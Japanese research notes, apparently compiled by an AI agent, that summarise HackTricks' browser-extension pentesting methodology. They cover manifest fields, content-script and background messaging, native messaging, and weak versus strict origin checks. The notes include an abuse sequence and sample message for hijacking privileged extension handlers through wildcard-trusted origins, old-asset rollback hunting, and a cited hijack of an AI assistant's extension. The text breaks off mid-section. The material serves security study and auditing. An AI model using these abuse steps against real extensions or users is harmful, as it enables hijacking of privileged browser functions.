# [44] ブラウザ拡張機能のペネトレーションテスト手法（Browser Extension Pentesting）

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
|-----|------|----------|------|
| https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html | full | GitHub raw（原典ソース） | レンダリング版ホスト `hacktricks.wiki` はegress proxyで403ブロック。同一内容の原典Markdownを `raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/README.md`（HTTP 200, 47572バイト, 877行）から**全文**取得。HackTricksの公式ソースリポジトリなので内容は完全同一。 |
| https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html | full | GitHub raw（原典ソース） | レンダリング版ホスト `cheatsheetseries.owasp.org` はegress proxyで403ブロック。同一内容の原典Markdownを `raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.md`（HTTP 200, 14833バイト, 335行）から**全文**取得。OWASP CheatSheetSeriesの公式ソースなので内容は完全同一。 |

> 注記: WebFetchは両ホストとも `EGRESS_BLOCKED` で失敗。`curl` で直接ホストへCONNECTしても egress proxy が `403 (policy denial)` を返した（proxy status の recentRelayFailures で確認）。しかし `raw.githubusercontent.com` は許可されているため、両資料の**上流ソースMarkdown**を完全取得できた。両者はそれぞれのサイトが実際にレンダリングしている元ファイルであり、内容は二次情報ではなく原典そのもの。よって両URLとも **full** と判定する。

## 要約（3〜10行）

- ブラウザ拡張はJavaScriptで書かれ、ブラウザがバックグラウンドで読み込む。独自のDOMを持つが他サイトのDOMと相互作用でき、他サイトの機密性・完全性・可用性（CIA）を侵害しうる。
- 拡張は3要素で理解できる: **Content Scripts**（単一ページのDOMに直接アクセス、権限はほぼ無いがコアへメッセージ送信可）、**Extension Core**（大半の権限を持つがWebとはXHR/Content Script経由のみ、ホストマシンへは直接アクセス不可）、**Native Binary**（NPAPI経由でユーザーの全権限でホストマシンにアクセス）。各要素はOSプロセス分離・サンドボックス・別JSヒープという強い境界で分離される。
- `manifest.json` が拡張のコアで、レイアウト・permissions・設定を定義する。攻撃面は `permissions`/`host_permissions`/`content_security_policy`/`web_accessible_resources`/`externally_connectable` に集約される。
- 通信経路: Web↔Content Script（`window.postMessage`/`window.addEventListener`, DOM共有）、Content Script↔Background（`chrome.runtime.sendMessage`/`onMessage`/`connect`, `chrome.tabs.sendMessage`）、外部→拡張（`externally_connectable` 経由の `chrome.runtime.sendMessage(extensionId, ...)`）、Background↔ネイティブバイナリ（`sendNativeMessage`/`connectNative`、RCEに至りうる）。
- 主要な脆弱性パターン: `externally_connectable` にXSS/テイクオーバー可能なオリジンを許可することでContent ScriptとCSPを完全バイパスして背景スクリプトへ到達、ワイルドカード信頼（`*.example.com`）、Post Message検証不備（isTrusted/origin/source）、Web DOMを信頼したContent ScriptのDOM XSS、ネイティブメッセージング経由のRCE、メモリ/コード/クリップボードへの機密情報保存。
- ソース取得: CRXをコマンドラインでZIPとしてDL、CRX Viewer（robwu.nl / Rob--W/crxviewer拡張）、ローカルプロファイルのExtensions/フォルダ閲覧、拡張子を.zipに変更して展開。
- ツール: **Tarnish**（manifest viewer, Fingerprint/Clickjacking解析, Dangerous Functions/Entry Points, CSP解析・バイパス、Retire.jsで既知脆弱ライブラリ検出）、**Neto**（Python3、拡張を展開して特徴抽出）、**crxaminer.tech**（権限からリスク評価）、**chrome-extension-manifests-dataset**（manifestデータセット検索）、悪性更新検知に **Assemblyline**。
- OWASP側（開発者防御視点）: 権限過剰、データ漏洩、XSS、非セキュア通信、コードインジェクション、悪性更新、サードパーティ依存、CSP欠如、非セキュアストレージ、プライバシー統制不足、DOMベースデータスキミング、プロトタイプベースデータスキミング（isolated world vs main world / prototype pollution）、非セキュアメッセージパッシング（sender検証）の13カテゴリ。

---

## 詳細ノート

# 第1部: HackTricks — ブラウザ拡張ペンテスト手法

（出典: https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html ／ 原典: HackTricks-wiki/hacktricks GitHub）

### Basic Information（基礎情報）（出典: HackTricks）

ブラウザ拡張はJavaScriptで書かれ、ブラウザがバックグラウンドで読み込む。拡張は独自のDOMを持つが、他サイトのDOMと相互作用できる。これは他サイトの**機密性(confidentiality)・完全性(integrity)・可用性(availability)（CIA）を侵害しうる**ことを意味する。

### Main Components（主要コンポーネント）（出典: HackTricks）

拡張のアーキテクチャは**3つのコンポーネント**として理解するのが最も分かりやすい（出典として http://webblaze.cs.berkeley.edu/papers/Extensions.pdf を引用）。

#### Content Scripts（コンテンツスクリプト）

各Content Scriptは**単一のWebページ**のDOMに直接アクセスでき、それゆえ**潜在的に悪意ある入力にさらされる**。しかし、Content Scriptは**拡張コア(extension core)へメッセージを送信する能力以外の権限を一切持たない**。

#### Extension Core（拡張コア）

拡張コアは**拡張の権限/アクセスの大部分**を含むが、拡張コアがWebコンテンツと相互作用できるのは [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) と Content Scripts 経由のみである。また、拡張コアはホストマシンへの直接アクセスを**持たない**。

#### Native Binary（ネイティブバイナリ）

拡張は、**ユーザーの完全な権限でホストマシンにアクセスできる**ネイティブバイナリを許可する。ネイティブバイナリは、Flashや他のブラウザプラグインが使用する標準の Netscape Plugin Application Programming Interface（[NPAPI](https://en.wikipedia.org/wiki/NPAPI)）を通じて拡張コアと相互作用する。

#### Boundaries（境界）

> [!CAUTION]
> ユーザーの完全な権限を得るには、攻撃者は拡張を説得して、悪意ある入力をContent Scriptから拡張コアへ、さらに拡張コアからネイティブバイナリへと渡させる必要がある。

拡張の各コンポーネントは**強い保護境界**によって互いに分離されている。各コンポーネントは**別々のOSプロセス**で動作する。Content Scriptと拡張コアは、ほとんどのOSサービスが利用できない**サンドボックスプロセス**で動作する。

さらに、Content Scriptは**別々のJavaScriptヒープで実行**されることにより、関連するWebページから分離される。Content ScriptとWebページは**同じ基盤のDOMにアクセス**するが、両者は**JavaScriptのポインタを一切交換しない**ため、JavaScript機能の漏洩を防いでいる。

〔補足（一般知識）〕この「別々のJavaScriptヒープ」「同じDOMを共有するがJSポインタは交換しない」という仕組みが、後述の **isolated world（分離ワールド）** の実体である。Content ScriptはページのDOMを読み書きできるが、ページのJS変数・関数には直接触れられない（逆も同様）。

### `manifest.json`（出典: HackTricks）

Chrome拡張は単なるZIPフォルダで、拡張子は [.crx](https://www.lifewire.com/crx-file-2620391) である。拡張のコアはフォルダのルートにある **`manifest.json`** ファイルで、レイアウト・permissions・その他の設定オプションを指定する。

例（逐語）:

```json
{
  "manifest_version": 2,
  "name": "My extension",
  "version": "1.0",
  "permissions": ["storage"],
  "content_scripts": [
    {
      "js": ["script.js"],
      "matches": ["https://example.com/*", "https://www.example.com/*"],
      "exclude_matches": ["*://*/*business*"]
    }
  ],
  "background": {
    "scripts": ["background.js"]
  },
  "options_ui": {
    "page": "options.html"
  }
}
```

〔補足（一般知識）〕このサンプルは `manifest_version: 2`（MV2）。MV2では `background.scripts` で永続バックグラウンドページを指定する。MV3では後述のとおり `background.service_worker`（Service Worker）に置き換わる。

#### `content_scripts`

Content Scriptは、ユーザーが**マッチするページに移動する**たびに**ロード**される。この例では **`https://example.com/*`** 式にマッチし、かつ **`*://*/*/business*`** 正規表現にマッチ**しない**任意のページ。Content Scriptは**ページ自身のスクリプトのように**実行され、ページの [DOM（Document Object Model）](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model) に任意アクセスできる。

```json
"content_scripts": [
    {
      "js": [
        "script.js"
      ],
      "matches": [
        "https://example.com/*",
        "https://www.example.com/*"
      ],
      "exclude_matches": ["*://*/*business*"],
    }
  ],
```

追加のURLフィルタは **`include_globs`** と **`exclude_globs`** で表現できる。

以下は、[storage API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/storage) を使って拡張のストレージから `message` の値を取得し、ページに「Explain」ボタンを追加するContent Scriptの例:

```js
chrome.storage.local.get("message", (result) => {
  let div = document.createElement("div")
  div.innerHTML = result.message + " <button>Explain</button>"
  div.querySelector("button").addEventListener("click", () => {
    chrome.runtime.sendMessage("explain")
  })
  document.body.appendChild(div)
})
```

このボタンがクリックされると、[**runtime.sendMessage() API**](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/runtime/sendMessage) を使って拡張ページへメッセージが送信される。これは、Content ScriptがAPIへ直接アクセスできる能力に制限があるためで、`storage` は数少ない例外の一つ。これらの例外を超える機能については、Content Scriptが通信できる拡張ページへメッセージが送られる。

> [!WARNING]
> ブラウザによってContent Scriptの能力は僅かに異なる。Chromiumベースのブラウザについては [Chrome Developers documentation](https://developer.chrome.com/docs/extensions/mv3/content_scripts/#capabilities) に、Firefoxについては [MDN](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_scripts#webextension_apis) に能力の一覧がある。\
> また、Content Scriptはバックグラウンドスクリプトと通信でき、アクションを実行して応答を返せる点も注目に値する。

ChromeでContent Scriptを表示・デバッグするには、Options > More tools > Developer tools、または Ctrl + Shift + I。開発者ツールを表示したら **Source タブ** をクリックし、次に **Content Scripts タブ** をクリックすると、各種拡張から実行中のContent Scriptを観察し、実行フローを追うためのブレークポイントを設定できる。

#### Injected content scripts（動的注入されるContent Script）

> [!TIP]
> **Content Scriptは必須ではない**: 拡張は `chrome.scripting`（Manifest V3）またはレガシーの `tabs.executeScript` API を使ってスクリプトを動的に注入することもできる。これにより、いつ注入するかをより細かく制御できる。

Content Scriptをプログラム的に注入するには、拡張はスクリプトを注入するページに対する [host permissions](https://developer.chrome.com/docs/extensions/reference/permissions) を持つ必要がある。この権限は、拡張のmanifestで**要求する**か、[**activeTab**](https://developer.chrome.com/docs/extensions/reference/manifest/activeTab) を通じて一時的に取得できる。

##### Example activeTab-based extension（activeTabベースの拡張の例）

```json:manifest.json
{
  "name": "My extension",
  ...
  "permissions": [
    "activeTab",
    "scripting"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_title": "Action Button"
  }
}
```

- **クリックでJSファイルを注入:**

```javascript
// content-script.js
document.body.style.backgroundColor = "orange"

//service-worker.js - Inject the JS file
chrome.action.onClicked.addListener((tab) => {
  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    files: ["content-script.js"],
  })
})
```

- **クリックで関数を注入:**

```javascript
//service-worker.js - Inject a function
function injectedFunction() {
  document.body.style.backgroundColor = "orange"
}

chrome.action.onClicked.addListener((tab) => {
  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: injectedFunction,
  })
})
```

##### Example with scripting permissions（scripting権限を用いた例）

```javascript
// service-workser.js
chrome.scripting.registerContentScripts([
  {
    id: "test",
    matches: ["https://*.example.com/*"],
    excludeMatches: ["*://*/*business*"],
    js: ["contentScript.js"],
  },
])

// Another example
chrome.tabs.executeScript(tabId, { file: "content_script.js" })
```

#### Content Scripts `run_at`

`run_at` フィールドは、**JavaScriptファイルがWebページに注入されるタイミング**を制御する。推奨かつデフォルトの値は `"document_idle"`。

取りうる値:

- **`document_idle`**: 可能な限りいつでも（Whenever possible）
- **`document_start`**: `css` のファイルの後、ただし他のDOMが構築される前・他のスクリプトが実行される前。
- **`document_end`**: DOMが完成した直後、ただし画像やフレームなどのサブリソースがロードされる前。

`manifest.json` 経由:

```json
{
  "name": "My extension",
  ...
  "content_scripts": [
    {
      "matches": ["https://*.example.com/*"],
      "run_at": "document_idle",
      "js": ["contentScript.js"]
    }
  ],
  ...
}
```

`service-worker.js` 経由:

```javascript
chrome.scripting.registerContentScripts([
  {
    id: "test",
    matches: ["https://*.example.com/*"],
    runAt: "document_idle",
    js: ["contentScript.js"],
  },
])
```

〔補足（一般知識・診断観点）〕`document_start` タイミングは、後述のOWASP「プロトタイプベースデータスキミング」で重要。攻撃者ページが拡張スクリプトより先にprototypeを汚染できるため、「`document_start` なら安全」という前提は成り立たない。

#### `background`（バックグラウンド）

Content Scriptが送ったメッセージは**バックグラウンドページ(background page)**が受け取り、これが拡張のコンポーネント間の調整の中心的役割を担う。特にバックグラウンドページは拡張のライフタイム全体で**永続**し、ユーザーの直接操作なしに目立たず動作する。独自のDOMを持ち、複雑な相互作用と状態管理を可能にする。

**要点(Key Points)**:

- **Background Page Role（バックグラウンドページの役割）:** 拡張の神経中枢として機能し、拡張の各部間の通信と調整を保証する。
- **Persistence（永続性）:** 常に存在し、ユーザーには見えないが拡張の機能に不可欠。
- **Automatic Generation（自動生成）:** 明示的に定義されていない場合、ブラウザが自動でバックグラウンドページを生成する。この自動生成ページには、拡張のmanifestで指定された全バックグラウンドスクリプトが含まれ、バックグラウンドタスクのシームレスな動作を保証する。

> [!TIP]
> ブラウザが（明示宣言がない場合に）自動でバックグラウンドページを生成してくれる利便性により、必要なバックグラウンドスクリプトがすべて統合され動作可能になり、拡張のセットアップが効率化される。

バックグラウンドスクリプトの例:

```js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request == "explain") {
    chrome.tabs.create({ url: "https://example.net/explanation" })
  }
})
```

これは [runtime.onMessage API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/runtime/onMessage) を使ってメッセージをリッスンする。`"explain"` メッセージを受け取ると、[tabs API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs) を使って新しいタブでページを開く。

バックグラウンドスクリプトをデバッグするには、**拡張の詳細画面でservice workerをinspect**すると、バックグラウンドスクリプトの開発者ツールが開く。

〔補足（一般知識・MV2/MV3差分）〕MV2では永続的な「background page」（`background.scripts` / `background.page`）だったが、MV3では**非永続のService Worker**（`background.service_worker`）に置き換わった。Service Workerはイベント駆動で、アイドル時に停止・再起動されるため、グローバル状態を前提とした設計はMV3では壊れる。診断時は「Service Workerがどのメッセージで起動し、senderを検証しているか」を確認する。

#### Options pages and other（オプションページとその他）

ブラウザ拡張は各種のページを含みうる:

- **Action pages（アクションページ）**: 拡張アイコンをクリックしたときに**ドロップダウンで表示**される。
- 拡張が**新しいタブでロード**するページ。
- **Option Pages（オプションページ）**: クリックすると拡張の上に表示される。先のmanifest例では、`chrome://extensions/?options=fadlhnelkbeojnebcbkacjilhnbjfjca` でこのページにアクセスできた（あるいはクリックで）。

これらのページはバックグラウンドページのように永続ではなく、必要に応じて動的にコンテンツをロードする。それでもバックグラウンドページと一部の能力を共有する:

- **Communication with Content Scripts（Content Scriptとの通信）:** バックグラウンドページと同様、これらのページはContent Scriptからメッセージを受け取れ、拡張内の相互作用を容易にする。
- **Access to Extension-Specific APIs（拡張固有APIへのアクセス）:** これらのページは、拡張に定義された権限に従って、拡張固有APIへ包括的にアクセスできる。

#### `permissions` & `host_permissions`

**`permissions`** と **`host_permissions`** は `manifest.json` のエントリで、ブラウザ拡張が**どの権限**（storage, location...）を、**どのWebページ**で持つかを示す。

ブラウザ拡張は非常に**特権的**でありうるため、悪意ある拡張や侵害された拡張は、攻撃者に**機密情報を盗み、ユーザーをスパイする様々な手段**を与えうる。

（HackTricksでは詳細を別ページ `browext-permissions-and-host_permissions.md` に委譲している。）

#### `content_security_policy`

**Content Security Policy (CSP)** は `manifest.json` 内でも宣言できる。定義されている場合、それが**脆弱**でありうる。

ブラウザ拡張ページのデフォルト設定はかなり制限的:

```bash
script-src 'self'; object-src 'self';
```

（CSPと潜在的バイパスの詳細は HackTricks の `../content-security-policy-csp-bypass/` に委譲。）

#### `web_accessible_resources`

Webページがブラウザ拡張のページ（例えば `.html` ページ）にアクセスするには、そのページが `manifest.json` の **`web_accessible_resources`** フィールドに記載されている必要がある。

例:

```javascript
{
 ...
 "web_accessible_resources": [
   {
     "resources": [ "images/*.png" ],
     "matches": [ "https://example.com/*" ]
   },
   {
     "resources": [ "fonts/*.woff" ],
     "matches": [ "https://example.com/*" ]
   }
 ],
 ...
}
```

これらのページは次のようなURLでアクセス可能:

```
chrome-extension://<extension-id>/message.html
```

公開拡張では **extension-id はアクセス可能**（公開されている）。

ただし、`manifest.json` のパラメータ **`use_dynamic_url`** が使われている場合、この**IDは動的**になりうる。

> [!TIP]
> ここに記載されたページでも、**Content Security Policy** のおかげで **ClickJacking から保護されている**可能性がある。よって、ClickJacking攻撃が可能と確認する前に、CSP（`frame-ancestors` セクション）も確認する必要がある。

これらのページへのアクセスが許可されることで、これらのページは**潜在的にClickJackingに脆弱**になる（HackTricksでは `browext-clickjacking.md` に詳細）。

> [!TIP]
> これらのページを拡張のみからロード可能とし、任意のURLからはロードできないようにすれば、ClickJacking攻撃を防げる。

> [!CAUTION]
> **`web_accessible_resources`** のページや拡張の他のページも**バックグラウンドスクリプトと通信可能**である点に注意。したがって、これらのページの一つが**XSSに脆弱**なら、より大きな脆弱性を開きうる。
>
> さらに、**`web_accessible_resources`** に記載されたページは iframe 内でしか開けないが、**新しいタブからは extension ID を知っていれば拡張の任意のページにアクセス可能**である。したがって、同じパラメータを悪用するXSSが見つかれば、そのページが **`web_accessible_resources`** に設定されていなくても悪用されうる。

#### `externally_connectable`（重要）

[**公式ドキュメント**](https://developer.chrome.com/docs/extensions/reference/manifest/externally-connectable) によれば、`"externally_connectable"` manifestプロパティは、**どの拡張やWebページ**が [runtime.connect](https://developer.chrome.com/docs/extensions/reference/runtime#method-connect) と [runtime.sendMessage](https://developer.chrome.com/docs/extensions/reference/runtime#method-sendMessage) を通じてあなたの拡張に接続できるかを宣言する。

- **`externally_connectable`** キーが manifest に**宣言されていない**か、**`"ids": ["*"]`** と宣言されている場合、**すべての拡張が接続できるが、Webページは一切接続できない**。
- **特定のIDが指定されている**場合（例 `"ids": ["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"]`）、**それらのアプリケーションのみ**が接続できる。
- **matches** が指定されている場合、それらのWebアプリが接続できる:

```json
"matches": [
      "https://*.google.com/*",
      "*://*.chromium.org/*",
```

- 空として指定された場合、すなわち **`"externally_connectable": {}`** の場合、いかなるアプリもWebも接続できない。

ここに記載する**拡張やURLが少ないほど、攻撃面は小さくなる**。

> [!CAUTION]
> **XSSやテイクオーバーに脆弱なWebページ**が **`externally_connectable`** に記載されている場合、攻撃者は**バックグラウンドスクリプトへ直接メッセージを送信**でき、Content ScriptとそのCSPを完全にバイパスできる。
>
> したがって、これは**非常に強力なバイパス**である。
>
> さらに、クライアントが不正な拡張をインストールした場合、許可されたWebページに **XSSデータを注入**したり、**`webRequest`** や **`declarativeNetRequest`** を悪用して対象ページの **JavaScriptファイル**へのリクエストを改変したりできる（脆弱な拡張と直接通信できなくても）。対象ページのCSPがこの連鎖を制約しうる。

##### Wildcard-trusted web origins to privileged action injection（ワイルドカード信頼オリジンから特権アクション注入）

拡張が `externally_connectable` を通じて**高特権のメッセージハンドラ**をWebに公開している場合、`https://*.example.com/*` のような広いパターンを信頼するのは避けるべき。マッチする任意のサブドメイン上の一つの **XSS**・**サブドメインテイクオーバー**・**ベンダーウィジェットの侵害**が、拡張のWeb向けAPIを乗っ取ることと等価になる。

典型的な悪用経路:

1. 拡張IDを見つけ、`externally_connectable.matches` を列挙する。
2. **特権アクション**（`open tab`, `read page`, `submit prompt`, `fetch with extension privileges`, `native messaging` など）をトリガーするメッセージタイプを特定する。
3. **いずれかの**信頼されたオリジンでJavaScript実行を得る。
4. リクエストを拡張へ直接送る:

```javascript
chrome.runtime.sendMessage("<extension-id>", {
  type: "privileged_action",
  payload: { attacker: "controlled" },
})
```

これは特に**エージェント型拡張(agentic extensions)**やアシスタントで危険で、「メッセージ」が拡張のhost権限で実行される完全な**命令プロンプト(instruction prompt)**になりうる。

> [!CAUTION]
> **信頼された第一者(first-party)サブドメイン上にホストされたベンダーコード**を、信頼境界の一部として扱うこと。`captcha.example.com`, `cdn.example.com`, サポートウィジェットのオリジンが `externally_connectable` で許可されている場合、その第三者コンポーネントのXSSは、バグがメインアプリケーションにあったのと全く同様に拡張へピボットしうる。

〔補足（一般知識・実例）〕HackTricksの参照[11]は「ShadowPrompt: How Any Website Could Have Hijacked Anthropic's Claude Chrome Extension」（koi.ai）。これは実在のエージェント型拡張（AnthropicのClaude Chrome拡張）で、`externally_connectable` の広い信頼が問題化した実例として引用されている。

##### Auditing `chrome.runtime.sendMessage` / `onMessageExternal` trust（信頼の監査）

Webページからのメッセージを受け付けるブラウザ拡張をレビューするとき:

- `chrome.runtime.onMessageExternal.addListener`、`chrome.runtime.onConnectExternal.addListener`、およびそれらのリスナーから到達可能な機微なハンドラを探す。
- 拡張が sender に対して、suffix・regex・ワイルドカードマッチではなく**厳密なオリジン等価(exact origin equality)**チェックを行っているか検証する。
- ハンドラが**メッセージタイプ + オリジンを一緒に**認可しているか検証する。テレメトリやオンボーディングに安全なオリジンが、特権アクションに自動的に安全とは限らない。
- 拡張が、親eTLD+1を共有するというだけでサブドメインを信頼していないことを確認する。
- 許可されたオリジンが**第三者JavaScript**・**ユーザー生成コンテンツ**・**レガシー静的アセット**をホストしていないか確認する。

悪いパターン（逐語）:

```javascript
if (sender.origin.endsWith(".example.com")) { /* trust */ }
if (/^https:\/\/.*\.example\.com$/.test(sender.origin)) { /* trust */ }
```

最小のオリジン集合への厳密マッチを推奨（逐語）:

```javascript
if (sender.origin !== "https://app.example.com") return
```

##### Rollback hunting on trusted static assets（信頼された静的アセットのロールバック探索）

信頼されたオリジンが予測可能なパスから**バージョン付き静的アセット**や埋め込みウィジェットを配信している場合、古いバージョンを辿って、まだ到達可能な脆弱ビルドを探すとよい。現行版はパッチ済みでも、拡張がアーカイブされたアセットをホストするオリジンをまだ信頼している場合に有効。

よくあるパターン:

- `/assets/widget/1.26.0/index.html`
- `/static/app-2024.12.1/`
- `/cdn/component/v1234/`

実践的チェック:

- ネットワークトラフィックやページソースで観測されたバージョンから開始する。
- セマンティックバージョン/ビルド番号をデクリメントして古いパスを要求する。
- 古いビルドで `200`, `301`, キャッシュヒットを探す。
- 古いJSバンドルをレビューし、DOM XSS・安全でないメッセージハンドラ・信頼オリジン上でJS実行を再確立できるガジェットエンドポイントを探す。

### Communication summary（通信のまとめ）（出典: HackTricks）

#### Extension <--> WebApp

Content ScriptとWebページの間の通信には通常、Post Messageが使われる。したがってWebアプリケーションでは通常 **`window.postMessage`** の呼び出しが、Content Scriptでは **`window.addEventListener`** のようなリスナーが見つかる。ただし、拡張は Post Message を送って Webアプリケーションと通信することもできる（したがってWebはそれを期待すべき）し、単にWebに新しいスクリプトをロードさせることもできる。

#### Inside the extension（拡張内部）

通常、拡張内でメッセージを送るには **`chrome.runtime.sendMessage`** 関数が使われる（通常は `background` スクリプトが処理）。それを受け取り処理するには、**`chrome.runtime.onMessage.addListener`** を呼ぶリスナーを宣言する。

単発メッセージの代わりに永続接続を持つために **`chrome.runtime.connect()`** を使うこともできる。次の例のように、メッセージの**送信**と**受信**に使える:

`chrome.runtime.connect()` の例（逐語）:

```javascript
var port = chrome.runtime.connect()

// Listen for messages from the web page
window.addEventListener(
  "message",
  (event) => {
    // Only accept messages from the same window
    if (event.source !== window) {
      return
    }

    // Check if the message type is "FROM_PAGE"
    if (event.data.type && event.data.type === "FROM_PAGE") {
      console.log("Content script received: " + event.data.text)
      // Forward the message to the background script
      port.postMessage({ type: "FROM_PAGE", text: event.data.text })
    }
  },
  false
)

// Listen for messages from the background script
port.onMessage.addListener(function (msg) {
  console.log("Content script received message from background script:", msg)
  // Handle the response message from the background script
})
```

バックグラウンドスクリプトから特定のタブのContent Scriptへメッセージを送ることも、**`chrome.tabs.sendMessage`** を呼び、送信先の**タブのID**を指定することで可能。

#### From allowed `externally_connectable` to the extension（許可された外部から拡張へ）

`externally_connectable` 設定で**許可されたWebアプリや外部ブラウザ拡張**は、次を使ってリクエストを送れる:

```javascript
chrome.runtime.sendMessage(extensionId, ...
```

ここでは**拡張ID**を明記する必要がある。

#### Native Messaging（ネイティブメッセージング）

バックグラウンドスクリプトはシステム内のバイナリと通信できる。これが適切にセキュアでない場合、**RCEのような致命的脆弱性を招きうる**。

```javascript
chrome.runtime.sendNativeMessage(
  "com.my_company.my_application",
  { text: "Hello" },
  function (response) {
    console.log("Received " + response)
  }
)
```

### Web ↔︎ Content Script Communication（Web↔Content Script通信）（出典: HackTricks）

**Content Script**が動作する環境とホストページが存在する環境は互いに**分離**されており、**隔離(isolation)**が保証されている。この隔離にもかかわらず、両者ともページの**DOM**（共有リソース）と相互作用できる。ホストページがContent Scriptと（またはContent Scriptを介して間接的に拡張と）通信するには、双方がアクセスできる**DOM**を通信チャネルとして利用する必要がある。

#### Post Messages

`content-script.js`（逐語）:

```javascript:content-script.js
// This is like "chrome.runtime.sendMessage" but to maintain the connection
var port = chrome.runtime.connect()

window.addEventListener(
  "message",
  (event) => {
    // We only accept messages from ourselves
    if (event.source !== window) {
      return
    }

    if (event.data.type && event.data.type === "FROM_PAGE") {
      console.log("Content script received: " + event.data.text)
      // Forward the message to the background script
      port.postMessage(event.data.text)
    }
  },
  false
)
```

`example.js`（逐語）:

```javascript:example.js
document.getElementById("theButton").addEventListener(
  "click",
  () => {
    window.postMessage(
      { type: "FROM_PAGE", text: "Hello from the webpage!" },
      "*"
    )
  },
  false
)
```

セキュアなPost Message通信は、受信メッセージの真正性をチェックすべきで、次を確認できる:

- **`event.isTrusted`**: これはイベントがユーザーのアクションによってトリガーされた場合のみ True。
  - Content Scriptは、ユーザーが何らかのアクションを実行した場合のみメッセージを期待するようにできる。
- **origin domain（オリジンドメイン）**: 許可ドメインのallowlistのみからメッセージを期待するようにできる。
  - 正規表現を使う場合は非常に注意すること。
- **Source**: `received_message.source !== window` を使い、メッセージがContent Scriptがリッスンしている**同じウィンドウから**来たか確認できる。

上記のチェックは、実施していても脆弱でありうる。（HackTricksでは `../postmessage-vulnerabilities/` に潜在的Post Messageバイパスを委譲。）

#### Iframe

もう一つの通信手段は **Iframe URLs** を通じたもの。（HackTricksでは例を `browext-xss-example.md` に委譲。）

#### DOM

これは「厳密には」通信手段ではないが、**WebとContent Scriptは共にWeb DOMにアクセスできる**。したがって、**Content Script**がDOMから何らかの情報を読み取り、**Web DOMを信頼**している場合、Webはこのデータを**改変**できる（Webは信頼すべきでないため、あるいはWebがXSSに脆弱なため）ので、**Content Scriptを侵害**しうる。

（**DOMベースのXSSでブラウザ拡張を侵害する例**は `browext-xss-example.md` に委譲。）

### Content Script ↔︎ Background Script Communication（出典: HackTricks）

Content Scriptは [**runtime.sendMessage()**](https://developer.chrome.com/docs/extensions/reference/runtime#method-sendMessage) **または** [**tabs.sendMessage()**](https://developer.chrome.com/docs/extensions/reference/tabs#method-sendMessage) 関数を使って、**単発のJSONシリアライズ可能な**メッセージを送れる。

**応答**を処理するには、返された **Promise** を使う。ただし後方互換のため、最後の引数として**コールバック**を渡すこともできる。

**Content Script**からのリクエスト送信はこうなる:

```javascript
;(async () => {
  const response = await chrome.runtime.sendMessage({ greeting: "hello" })
  // do something with response here, not outside the function
  console.log(response)
})()
```

**拡張**（通常は**バックグラウンドスクリプト**）からのリクエスト送信。選択したタブのContent Scriptへメッセージを送る例:

```javascript
// From https://stackoverflow.com/questions/36153999/how-to-send-a-message-between-chrome-extension-popup-and-content-script
;(async () => {
  const [tab] = await chrome.tabs.query({
    active: true,
    lastFocusedWindow: true,
  })
  const response = await chrome.tabs.sendMessage(tab.id, { greeting: "hello" })
  // do something with response here, not outside the function
  console.log(response)
})()
```

**受信側**では、[**runtime.onMessage**](https://developer.chrome.com/docs/extensions/reference/runtime#event-onMessage) **イベントリスナー**を設定してメッセージを処理する。これはContent Scriptからでも拡張ページからでも同じ:

```javascript
// From https://stackoverflow.com/questions/70406787/javascript-send-message-from-content-js-to-background-js
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  console.log(
    sender.tab
      ? "from a content script:" + sender.tab.url
      : "from the extension"
  )
  if (request.greeting === "hello") sendResponse({ farewell: "goodbye" })
})
```

上の例では **`sendResponse()`** は同期的に実行された。`onMessage` イベントハンドラを **`sendResponse()`** の**非同期実行**用に変更するには、`return true;` を含めることが必須。

重要な考慮点として、複数のページが `onMessage` イベントを受信するよう設定されているシナリオでは、特定のイベントに対して**最初に `sendResponse()` を実行したページ**だけが応答を有効に届けられる。同じイベントへの後続の応答は考慮されない。

新しい拡張を作るときは、コールバックよりPromiseを優先すべき。コールバックを使う場合、`sendResponse()` 関数は、同期コンテキスト内で直接実行されるか、イベントハンドラが `true` を返して非同期操作を示す場合のみ有効。いずれのハンドラも `true` を返さないか、`sendResponse()` 関数がメモリから削除（ガベージコレクト）された場合、`sendMessage()` に関連付けられたコールバックがデフォルトでトリガーされる。

### Native Messaging（詳細）（出典: HackTricks）

ブラウザ拡張は、**stdin経由でシステム内のバイナリと通信**することもできる。アプリケーションは、次のようなjsonでその旨を示すjsonをインストールする必要がある:

```json
{
  "name": "com.my_company.my_application",
  "description": "My Application",
  "path": "C:\\Program Files\\My Application\\chrome_native_messaging_host.exe",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://knldjmfmopnpolahpmmgbagdohdnhkik/"]
}
```

ここで `name` は、ブラウザ拡張のバックグラウンドスクリプトからアプリケーションと通信するために [`runtime.connectNative()`](https://developer.chrome.com/docs/extensions/reference/api/runtime#method-connectNative) または [`runtime.sendNativeMessage()`](https://developer.chrome.com/docs/extensions/reference/api/runtime#method-sendNativeMessage) に渡される文字列。`path` はバイナリへのパス。有効な `type` は stdio（stdinとstdoutを使う）の1つのみ。`allowed_origins` はこれにアクセスできる拡張を示す（ワイルドカード不可）。

Chrome/Chromiumは、このjsonを一部のWindowsレジストリと、macOS/Linuxの一部のパスから探す（詳細は[公式ドキュメント](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging)）。

> [!TIP]
